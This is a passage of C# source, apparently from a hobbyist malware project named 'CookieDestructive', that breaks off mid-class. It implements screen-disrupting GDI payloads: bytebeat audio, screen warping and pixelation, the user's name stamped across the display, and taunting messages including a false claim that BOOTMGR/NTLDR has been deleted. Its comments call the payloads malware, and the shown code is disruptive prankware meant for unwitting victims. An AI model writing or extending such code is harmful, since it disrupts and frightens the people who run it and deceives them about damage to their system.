using CookieDestructive.Properties;
using CookieDestructive;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Media;
//using System.Net;     this caused problems in the first build of cookie, and the bootmgr and ntldr shit doesnt work
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

internal static class Program
{
    // do not look at form1 or form2, its for old builds of cookie 
    // Cookie by EmmyMalware
    // Also if ur looking at this on GitHub, Hi!
    // It has 12 payloads because I ran out of ideas
    // perry the plapus i leik plaodds im making a joke by my psn disc

    // Let's define the useless bbs, ig
    private class bb1 : PayloadGDI
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        ((t >> 4) * t & (t >> 3 ^ t >> 4) + (t >> 5 | t >> 2)) | (t * (t >> 3 | t >> 6) >> (t >> 5 | t >> 7) ^ (t >> t) + ((t / 2) * t >> 12))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb2 : PayloadGDI
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 22050;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (((t >> 1) * (15 & (0x234568a0 >> ((t >> 8) & 28)))) | ((t >> 1) >> (t >> 15)) ^ (t >> 4)) + ((t >> 50) & (t & 10))
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb3 : PayloadGDI
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (t * (t >> 5 | t >> 8) | t >> 80 ^ t) + 64
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }

    private class bb4 : PayloadGDI
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        (t * (t >> 5 | t >> 8) | t >> 80 ^ t) + 64
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb5 : PayloadGDI
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 30;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        3 * (t >> 6 | t | t >> (t >> 16)) + (7 & t >> 11) * t / 100 * t
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }
    private class bb6 : PayloadGDI
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            using (var stream = new MemoryStream())
            {
                var writer = new BinaryWriter(stream);

                writer.Write("RIFF".ToCharArray());  // chunk id
                writer.Write((UInt32)0);             // chunk size
                writer.Write("WAVE".ToCharArray());  // format

                writer.Write("fmt ".ToCharArray());  // chunk id
                writer.Write((UInt32)16);            // chunk size
                writer.Write((UInt16)1);             // audio format

                var channels = 1;
                var sample_rate = 8000;
                var bits_per_sample = 8;

                writer.Write((UInt16)channels);
                writer.Write((UInt32)sample_rate);
                writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                writer.Write((UInt16)bits_per_sample);

                writer.Write("data".ToCharArray());

                var seconds = 60;

                var data = new byte[sample_rate * seconds];

                for (var t = 0; t < data.Length; t++)
                    data[t] = (byte)(
                        9 * t & t >> 4 | 5 * t & t >> 7 | 3 * t & t >> 10
                        //t * (42 & t >> 10)
                        //t | t % 255 | t % 257
                        //t * (t >> 9 | t >> 13) & 16
                        );

                writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                foreach (var elt in data) writer.Write(elt);

                writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                stream.Seek(0, SeekOrigin.Begin);

                new SoundPlayer(stream).PlaySync();
            }
            Thread.Sleep(0);
        }
    }

    // Payloadz

    private class payload1 : PayloadGDI
    {   
        public override void Draw(IntPtr hdc)
        {
            Random r = new Random();
            int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
            int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
            POINT[] lppoint = new POINT[3];
            lppoint[0].X = (left + 50) + 0;
            lppoint[0].Y = (top - 50) + 0;
            lppoint[1].X = (right + 50) + 0;
            lppoint[1].Y = (top + 50) + 0;
            lppoint[2].X = (left - 50) + 0;
            lppoint[2].Y = (bottom - 50) + 0;
            PlgBlt(hdc, lppoint, hdc, left - 20, top - 20, (right - left) + 40, (bottom - top) + 40, IntPtr.Zero, 0, 0);
            Thread.Sleep(0);
        }
    }

    #region rgb to hsl
    public struct RGB
    {
        private byte _r;
        private byte _g;
        private byte _b;

        public RGB(byte r, byte g, byte b)
        {
            this._r = r;
            this._g = g;
            this._b = b;
        }

        public byte R
        {
            get { return this._r; }
            set { this._r = value; }
        }

        public byte G
        {
            get { return this._g; }
            set { this._g = value; }
        }

        public byte B
        {
            get { return this._b; }
            set { this._b = value; }
        }

        public bool Equals(RGB rgb)
        {
            return (this.R == rgb.R) && (this.G == rgb.G) && (this.B == rgb.B);
        }
    }

    public struct HSL
    {
        private int _h;
        private float _s;
        private float _l;

        public HSL(int h, float s, float l)
        {
            this._h = h;
            this._s = s;
            this._l = l;
        }

        public int H
        {
            get { return this._h; }
            set { this._h = value; }
        }

        public float S
        {
            get { return this._s; }
            set { this._s = value; }
        }

        public float L
        {
            get { return this._l; }
            set { this._l = value; }
        }

        public bool Equals(HSL hsl)
        {
            return (this.H == hsl.H) && (this.S == hsl.S) && (this.L == hsl.L);
        }
    }

    public static RGB HSLToRGB(HSL hsl)
    {
        byte r = 0;
        byte g = 0;
        byte b = 0;

        if (hsl.S == 0)
        {
            r = g = b = (byte)(hsl.L * 255);
        }
        else
        {
            float v1, v2;
            float hue = (float)hsl.H / 360;

            v2 = (hsl.L < 0.5) ? (hsl.L * (1 + hsl.S)) : ((hsl.L + hsl.S) - (hsl.L * hsl.S));
            v1 = 2 * hsl.L - v2;

            r = (byte)(255 * HueToRGB(v1, v2, hue + (1.0f / 3)));
            g = (byte)(255 * HueToRGB(v1, v2, hue));
            b = (byte)(255 * HueToRGB(v1, v2, hue - (1.0f / 3)));
        }

        return new RGB(r, g, b);
    }

    private static float HueToRGB(float v1, float v2, float vH)
    {
        if (vH < 0)
            vH += 1;

        if (vH > 1)
            vH -= 1;

        if ((6 * vH) < 1)
            return (v1 + (v2 - v1) * 6 * vH);

        if ((2 * vH) < 1)
            return v2;

        if ((3 * vH) < 2)
            return (v1 + (v2 - v1) * ((2.0f / 3) - vH) * 6);

        return v1;
    }
    #endregion

    private class payload2 : PayloadGDI
    {
        private int redrawCounter;
        private int codcod;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Random r = new Random();
                Graphics g = Graphics.FromHdc(hdc);

                redrawCounter += 1;
                int cc = redrawCounter;
                codcod += 2;
                int cod = codcod;
                HSL data = new HSL(cc, 1f, 0.5f);
                RGB value = HSLToRGB(data);
                HSL data1 = new HSL(cod, 1f, 0.5f);
                RGB value1 = HSLToRGB(data1);
                SolidBrush sb = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                g.DrawString("BOOTMGR/NTLDR is deleted!", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("Get fucked!", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("Cookie", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("You failed to h4x0r, take away ur sk1llz", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("Du bist dumm!", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("For running this!", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("Dorknuts", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString(Environment.UserName, new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString(Environment.UserName, new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("Get banned from Club Penguin!", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                g.DrawString("CookieDestructive.exe", new Font(FontFamily.GenericSansSerif, random.Next(100)), sb, random.Next(screenW), random.Next(screenH));
                redrawCounter += 1;
                data = new HSL(cc, 1f, 0.5f);
                value = HSLToRGB(data);
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
            Thread.Sleep(0);
        }
    }
    private class payload3 : PayloadGDI
    {
        // Hi if u use a decomp hi
        private int redrawCounter;
        private int codcod;
        public override void Draw(IntPtr hdc)
        {
            int sx = Screen.PrimaryScreen.Bounds.Width;
            int sy = Screen.PrimaryScreen.Bounds.Height;
            Random r = new Random();
            int y = r.Next(-sy, sy);
            int s = redrawCounter;
            for (int i = 0; i < sx; i += 200)
            {
                StretchBlt(hdc, i, s, 200, 200, hdc, i - 5, s - 5, 210, 210, TernaryRasterOperations.SRCCOPY);
            }
            redrawCounter += 200;
            if (redrawCounter >= screenH)
            { redrawCounter = 0; }
            Thread.Sleep(0);
        }
    }

    public static Image SetOpacity(this Image image, float opacity)
    {
        var colorMatrix = new ColorMatrix();
        colorMatrix.Matrix33 = opacity;
        var imageAttributes = new ImageAttributes();
        imageAttributes.SetColorMatrix(
            colorMatrix,
            ColorMatrixFlag.Default,
            ColorAdjustType.Bitmap);
        var output = new Bitmap(image.Width, image.Height);
        using (var gfx = Graphics.FromImage(output))
        {
            gfx.DrawImage(
                image,
                new Rectangle(0, 0, image.Width, image.Height),
                0,
                0,
                image.Width,
                image.Height,
                GraphicsUnit.Pixel,
                imageAttributes);
        }
        return output;
    }

    public static void ApplyNormalPixelate(ref Bitmap bmp, Size squareSize)
    {
        Bitmap TempBmp = (Bitmap)bmp.Clone();

        BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, PixelFormat.Format24bppRgb);
        BitmapData TempBmpData = TempBmp.LockBits(new Rectangle(0, 0, TempBmp.Width, TempBmp.Height), ImageLockMode.ReadOnly, PixelFormat.Format24bppRgb);

        unsafe
        {
            byte* ptr = (byte*)bmpData.Scan0.ToPointer();
            byte* TempPtr = (byte*)TempBmpData.Scan0.ToPointer();

            int stopAddress = (int)ptr + bmpData.Stride * bmpData.Height;

            int Val = 0;
            int i = 0, X = 0, Y = 0;
            int BmpStride = bmpData.Stride;
            int BmpWidth = bmp.Width;
            int BmpHeight = bmp.Height;
            int SqrWidth = squareSize.Width;
            int SqrHeight = squareSize.Height;
            int XVal = 0, YVal = 0;

            while ((int)ptr != stopAddress)
            {
                X = i % BmpWidth;
                Y = i / BmpWidth;

                XVal = X + (SqrWidth - X % SqrWidth);
                YVal = Y + (SqrHeight - Y % SqrHeight);

                if (XVal < 0 && XVal >= BmpWidth)
                    XVal = 0;

                if (YVal < 0 && YVal >= BmpHeight)
                    YVal = 0;

                if (XVal > 0 && XVal < BmpWidth && YVal > 0 && YVal < BmpHeight)
                {
                    Val = (YVal * BmpStride) + (XVal * 3);

                    ptr[0] = TempPtr[Val];
                    ptr[1] = TempPtr[Val + 1];
                    ptr[2] = TempPtr[Val + 2];
                }

                ptr += 3;
                i++;
            }
        }

        bmp.UnlockBits(bmpData);
        TempBmp.UnlockBits(TempBmpData);
    }

    public struct POINT
    {
        public int X;
        public int Y;

        public POINT(int x, int y)
        {
            this.X = x;
            this.Y = y;
        }

        public static implicit operator System.Drawing.Point(POINT p)
        {
            return new System.Drawing.Point(p.X, p.Y);
        }

        public static implicit operator POINT(System.Drawing.Point p)
        {
            return new POINT(p.X, p.Y);
        }
    }

    private class payload4 : PayloadGDI
    {
        private int redrawCounter;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                //Create a new bitmap.
                var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                               Screen.PrimaryScreen.Bounds.Height,
                                               PixelFormat.Format32bppArgb);

                // Create a graphics object from the bitmap.
                var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

                // Take the screenshot from the upper left corner to the right bottom corner.
                gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                            Screen.PrimaryScreen.Bounds.Y,
                                            0,
                                            0,
                                            Screen.PrimaryScreen.Bounds.Size,
                                            CopyPixelOperation.SourceCopy);
                ApplyNormalPixelate(ref bmpScreenshot, new Size(10, 10));
                Image bmp = SetOpacity(bmpScreenshot, 0.1F);
                g.DrawImage(bmp, 5, 5);
            }
            catch { }
            Thread.Sleep(0);
        }
    }

    [DllImport("user32.dll")]
    static extern IntPtr GetDesktopWindow();
    [DllImport("gdi32.dll")]
    static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc,
int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask,
int yMask);

    private class payload5 : PayloadGDI
    {
        private int redrawCounter;
        public override void Draw(IntPtr hdc)
        {
            Random r = new Random();
            int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
            int left = Screen.PrimaryScreen.Bounds.Left, right = Screen.PrimaryScreen.Bounds.Right, top = Screen.PrimaryScreen.Bounds.Top, bottom = Screen.PrimaryScreen.Bounds.Bottom;
            POINT[] lppoint = new POINT[3];
            lppoint[0].X = (left + 20) + 0;
            lppoint[0].Y = (top - 20) + 0;
            lppoint[1].X = (right + 20) + 0;
            lppoint[1].Y = (top + 50) + 0;
            lppoint[2].X = (left - 50) + 0;
            lppoint[2].Y = (bottom - 50) + 0;
            PlgBlt(hdc, lppoint, hdc, left - 10, top - 60, (right - left) + 40, (bottom - top) + 30, IntPtr.Zero, 0, 0);
        }
    }

    [DllImport("user32.dll")]
    static extern IntPtr GetWindowDC(IntPtr hWnd);

    private class payload6 : PayloadGDI
    {
        private int redrawCounter;
        private int redrawCounter1;
        public override void Draw(IntPtr hdc)
        {
            Random r = new Random();
            int x = Screen.PrimaryScreen.Bounds.X;
            int y = Screen.PrimaryScreen.Bounds.Y;
            int left = Screen.PrimaryScreen.Bounds.Left;
            int top = Screen.PrimaryScreen.Bounds.Top;
            int right = Screen.PrimaryScreen.Bounds.Right;
            int bottom = Screen.PrimaryScreen.Bounds.Bottom;
            IntPtr hwnd = GetDesktopWindow();
            POINT[] lppoint = new POINT[3];
            hdc = GetWindowDC(hwnd);
            int r1 = r.Next(x, y);
            int r2 = r.Next(x, y);
            int r3 = r.Next(x, y);
            int r4 = r.Next(x, y);
            int r5 = r.Next(x, y);
            int r6 = r.Next(x, y);
            int cx = Cursor.Position.X;
            int cy = Cursor.Position.Y;
            redrawCounter++;
            int re = redrawCounter;
            int s = r.Next(-5 - re, 6 + re);
            BitBlt(hdc, r.Next(-1, 2), r.Next(-1, 2), x, y, hdc, 0, 0, 15597702);
            lppoint[0].X = left - (0 - re - re);
            lppoint[0].Y = top + (55 + re);
            lppoint[1].X = right - (1000 - re);
            lppoint[1].Y = top + (250 - re);
            lppoint[2].X = left + (650);
            lppoint[2].Y = bottom - (600 - re - re);
            PlgBlt(hdc, lppoint, hdc, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
            redrawCounter1++;
            if (redrawCounter1 == 5) { redrawCounter1 = 0; Redraw(); }
            Thread.Sleep(0);
        }
    }

    private class payload7 : PayloadGDI
    {
        Image r = Resources.Perry_the_Platypus; // Agent PP
        public override void Draw(IntPtr hdc)
        {
            Graphics g = Graphics.FromHdc(hdc);
            int x = random.Next(screenW);
            int y = random.Next(screenH);
            g.DrawImage(r, x, y);
        }
    }

    private class payload8 : PayloadGDI
    {
        private int redrawCounter;
        private int codcod;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                redrawCounter += 1;
                int cc = redrawCounter;
                codcod += 2;
                int cod = codcod;
                HSL data = new HSL(cc, 1f, 0.5f);
                RGB value = HSLToRGB(data);
                HSL data1 = new HSL(cod, 1f, 0.5f);
                RGB value1 = HSLToRGB(data1);
                SolidBrush sb = new SolidBrush(Color.FromArgb(value.R, value.G, value.B));
                SolidBrush blk = new SolidBrush(Color.Yellow); // Piss
                Pen pen = new Pen(Color.White, 2);
                g.FillEllipse(blk, Cursor.Position.X - 51, Cursor.Position.Y - 51, 102, 102);
                g.FillEllipse(sb, Cursor.Position.X - 50, Cursor.Position.Y - 50, 100, 100);
                g.FillEllipse(blk, Cursor.Position.X - 26, Cursor.Position.Y - 26, 52, 52);
                g.FillEllipse(sb, Cursor.Position.X - 25, Cursor.Position.Y - 25, 50, 50);
                redrawCounter += 1;
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
            Thread.Sleep(0);
        }
    }

    [DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
    public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

    private class payload9 : PayloadGDI
    {
        private int redrawCounter;
        private int codcod;
        public override void Draw(IntPtr hdc)
        {
            try
            {
                IntPtr intPtr = CreateCompatibleDC(hdc);
                IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
                SelectObject(intPtr, intPtr2);
                BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
                Graphics g = Graphics.FromHdc(intPtr);
                g.RotateTransform(random.Next(360));
                Brush brush = new SolidBrush(Color.FromArgb(random.Next(255), random.Next(255), random.Next(255)));
                g.DrawString(Environment.UserName, new Font(FontFamily.GenericSansSerif, random.Next(1, 100)), brush, random.Next(screenW), random.Next(screenH));
                BitBlt(hdc, 0, 0, screenW, screenH, intPtr, random.Next(-1, 2), random.Next(-1, 2), (int)CopyPixelOperation.SourceCopy);
                DeleteObject(intPtr);
                DeleteObject(intPtr2);
            }
            catch { }
            Thread.Sleep(random.Next(2));
        }
    }

    private class payload10 : PayloadGDI
    {
        private static new Random random = new Random();
        private int redrawCounter;
        private int codcod;
        private int ballWidth = 100;
        private int ballHeight = 100;
        private int ballPosX = Cursor.Position.X;
        private int ballPosY = Cursor.Position.Y;
        private int moveStepX = 10;
        private int moveStepY = 10;
        private static SolidBrush hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));

        public override void Draw(IntPtr hdc)
        {
            try
            {
                Graphics g = Graphics.FromHdc(hdc);
                Random r = new Random();
                int x = screenW;
                int y = screenH;

                g.FillEllipse(hbrush, ballPosX, ballPosY, ballWidth, ballHeight);
                ballPosX += moveStepX;
                if (
                    ballPosX < 0 ||
                    ballPosX + ballWidth > screenW
                    )
                {
                    moveStepX = -moveStepX;
                    hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                }

                ballPosY += moveStepY;
                if (
                    ballPosY < 0 ||
                    ballPosY + ballHeight > screenH
                    )
                {
                    moveStepY = -moveStepY;
                    hbrush = new SolidBrush(Color.FromArgb(255, random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)));
                }
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
            Thread.Sleep(5);
        }
    }

    private class payload11 : PayloadGDI
    {
        private int redrawCounter;
        private int codcod;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                int ccs = codcod;
                Graphics g = Graphics.FromHdc(hdc);
                HSL data = new HSL(ccs, 1f, 0.5f);
                RGB value = HSLToRGB(data);
                Pen pen = new Pen(Color.FromArgb(255, value.R, value.G, value.B), 50);
                Pen t = new Pen(Color.FromArgb(random.Next(0, 255), random.Next(0, 255), random.Next(0, 255), random.Next(0, 255)), random.Next(0, 255));
                t.EndCap = LineCap.ArrowAnchor;
                t.StartCap = LineCap.RoundAnchor;
                pen.LineJoin = LineJoin.Bevel;
                pen.EndCap = LineCap.ArrowAnchor;
                pen.StartCap = LineCap.RoundAnchor;
                int curx = Cursor.Position.X;
                int cury = Cursor.Position.Y;
                g.DrawLine(pen, screenW / 2, screenH / 2, curx, cury);
                g.DrawLine(t, screenW / 2, screenH / 2, random.Next(0, screenW), random.Next(0, screenH));
                codcod++;
                redrawCounter++;
                if (redrawCounter >= 5)
                {
                    Redraw();
                    redrawCounter = 0;
                }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
        }
    }

    // last payload !!!
    private class payload12 : PayloadGDI
    {
        private static new Random random = new Random();
        private int redrawCounter;
        private int codcod;
        private int ballWidth = 200;
        private int ballHeight = 30;
        private int ballPosX = random.Next(0, Screen.PrimaryScreen.Bounds.Width - 300);
        private int ballPosY = random.Next(0, Screen.PrimaryScreen.Bounds.Height - 50);
        private int moveStepX = 10;
        private int moveStepY = 10;

        public override void Draw(IntPtr hdc)
        {
            try
            {
                int ccs = redrawCounter;
                Graphics g = Graphics.FromHdc(hdc);
                HSL data = new HSL(ccs, 1f, 0.5f);
                RGB value = HSLToRGB(data);
                Random r = new Random();
                int x = screenW;
                int y = screenH;
                SolidBrush sbrush1 = new SolidBrush(Color.FromArgb(255, value.R, value.G, value.B));
                g.DrawString("Enjoy your new PC!", new Font(FontFamily.GenericSansSerif, 25), sbrush1, ballPosX, ballPosY);
                g.DrawString("rip pc :(", new Font(FontFamily.GenericSansSerif, random.Next(0, 100)), sbrush1, random.Next(-screenW, screenW + screenW), random.Next(-screenH, screenH + screenH));
                redrawCounter++;
                ballPosX += moveStepX;
                if (
                    ballPosX < 0 ||
                    ballPosX + ballWidth > screenW
                    )
                {
                    moveStepX = -moveStepX;
                }

                ballPosY += moveStepY;
                if (
                    ballPosY < 0 ||
                    ballPosY + ballHeight > screenH
                    )
                {
                    moveStepY = -moveStepY;

                }
                if (redrawCounter >= 360) { redrawCounter = 0; }
                if (codcod >= 360) { codcod = 0; }
            }
            catch { }
            Thread.Sleep(0);
        }
    }

    private class cur : PayloadGDI
    {
        private int redrawCounter;
        private int codcod;
        private int ballWidth = 1;
        private int ballHeight = 1;
        private int ballPosX = Cursor.Position.X;
        private int ballPosY = Cursor.Position.Y;
